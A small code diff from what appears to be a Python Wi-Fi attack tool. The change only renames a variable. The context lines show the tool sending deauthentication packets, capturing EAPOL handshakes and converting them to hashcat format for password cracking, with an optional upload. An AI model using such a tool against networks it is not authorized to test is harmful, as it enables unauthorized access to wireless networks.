@@ -139,7 +139,7 @@ def packethandler(pkt):
             pktdump.write(pkt)
             if pkt.haslayer(EAPOL):
                 print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC:{pkt.addr2} and DST:{pkt.addr1}{bcolors.ENDC}")
-                packet_list.append(pkt)
+                PACKET_LIST.append(pkt)
 
 
 def cap_converter():
@@ -235,7 +235,7 @@ if __name__ == '__main__':
     send_deauth_packet()  # Send Deauth packet function.
     print(f"{bcolors.OKBLUE}Sent {deauth_count} Deauth Packet(s){bcolors.ENDC}")
     t.join()
-    print(f"{bcolors.WARNING}Captured Total {len(packet_list)} EAPOL Packets{bcolors.ENDC}"'\n')
+    print(f"{bcolors.WARNING}Captured Total {len(PACKET_LIST)} EAPOL Packets{bcolors.ENDC}"'\n')
     print(f"Packets Written to: {(os.getcwd()+'/'+pcap_file)}")
     cap_converter()  # Function that converts pcap to hashcat 22000 mode.
     if enable_upload:
